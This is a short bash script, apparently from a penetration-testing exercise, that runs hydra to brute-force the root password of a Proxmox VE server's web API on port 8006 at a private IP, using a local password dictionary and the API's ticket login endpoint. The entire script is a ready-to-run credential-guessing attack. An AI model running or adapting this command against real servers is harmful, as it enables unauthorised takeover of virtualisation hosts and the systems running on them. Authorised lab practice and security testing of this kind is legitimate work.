#!/bin/bash

vIPDelProxmox="172.16.254.9"

hydra -l root -P ~/diccionario.txt $vIPDelProxmox -s 8006 https-post-form "/api2/json/access/ticket:username=root&password=^PASS^:Invalid"
